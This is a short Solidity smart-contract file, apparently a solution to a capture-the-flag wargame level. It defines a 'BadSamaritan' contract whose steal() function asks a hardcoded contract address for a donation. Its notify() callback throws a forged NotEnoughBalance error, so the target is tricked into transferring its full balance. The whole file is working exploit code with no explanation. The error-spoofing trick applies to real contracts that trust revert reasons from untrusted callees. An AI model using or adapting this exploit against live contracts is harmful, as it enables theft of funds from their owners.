// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface INotifyable {
  function notify(uint256 amount) external;
}

contract BadSamaritan is INotifyable {
  error NotEnoughBalance();

  function notify(uint256 amount) external pure override {
    if (amount != 1000000) {
      revert NotEnoughBalance();
    }
  }

  function steal() public returns (bool success) {
    (success, ) = address(0x26173a8bA05980F97D418890Ce04b1467c3de118).call(
      abi.encodeWithSignature("requestDonation()")
    );
    require(success, "Could not steal.");
  }
}